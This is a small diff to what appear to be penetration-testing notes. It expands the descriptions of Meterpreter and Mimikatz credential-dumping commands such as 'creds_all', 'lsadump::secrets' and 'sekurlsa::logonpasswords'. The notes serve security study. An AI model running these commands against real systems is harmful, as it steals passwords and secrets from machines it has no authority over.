@@ -193,7 +193,7 @@ example: `creds_all` Gives us credentials all credentials.
 
 still in meterpreter session
 
-`pwd`
+`pwd`: shows us the actual path
 
 `cd C:\\`
 
@@ -215,6 +215,6 @@ still in meterpreter session
 
 `lsadump::secrets`:DUMPING LSASECRETS
 
-`sekurlsa::logonpasswords`:Display logon passwords, if configured passwords show in clear text when logon
+`sekurlsa::logonpasswords`:Display logon passwords, if configured passwords show in clear text when logon is configured as cleartext
 
 
